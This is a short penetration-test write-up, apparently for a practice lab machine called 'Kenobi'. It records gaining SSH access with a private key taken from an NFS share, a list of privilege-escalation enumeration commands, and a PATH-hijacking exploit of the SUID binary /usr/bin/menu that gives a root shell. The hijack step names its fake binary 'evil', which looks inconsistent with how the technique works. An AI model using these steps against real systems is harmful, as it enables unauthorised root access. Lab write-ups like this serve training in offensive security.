# Detailed Notes ‚Äì Kenobi Pentest

## üîç Recon & Enumeration
- **Host Info:**
```bash
whoami        # kenobi
id            # uid=1000(kenobi) gid=1000(kenobi), groups=...
uname -a      # Linux kenobi 5.15.0-139-generic x86_64
lsb_release -a # Ubuntu 20.04.6 LTS
```
- Home directories: `/home/kenobi`, `/home/ubuntu`  
- Web root: `/var/www/html`  

---

## üóù Initial Access
- Retrieved private RSA key from NFS share.  
- SSH into target:
```bash
ssh -i ~/id_rsa kenobi@10.10.3.183
```

---

## ‚ö° Privilege Escalation

### SUDO Permissions
```bash
sudo -l
```

### SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

### File Capabilities
```bash
getcap -r /
```

### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers --all
```

### Writable Directories
```bash
find / -writable -type d 2>/dev/null
```

### Processes
```bash
ps aux --forest
```

---

## üí• Exploitation
- Exploited root-owned `/usr/bin/menu` via **PATH hijacking**:
```bash
echo /bin/sh > /tmp/evil
chmod +x /tmp/evil
export PATH=/tmp:$PATH
/usr/bin/menu
```
- Verified root shell:
```bash
whoami  # root
```
- **PKEXEC exploit** not needed; `/usr/bin/menu` sufficient for escalation.

---

## üìù Observations
- Target system is misconfigured:
  - Writable directories and insecure scripts exist.  
  - SUID binaries present with privilege escalation potential.  
  - Private RSA key accessible in shared location ‚Üí initial access vector.
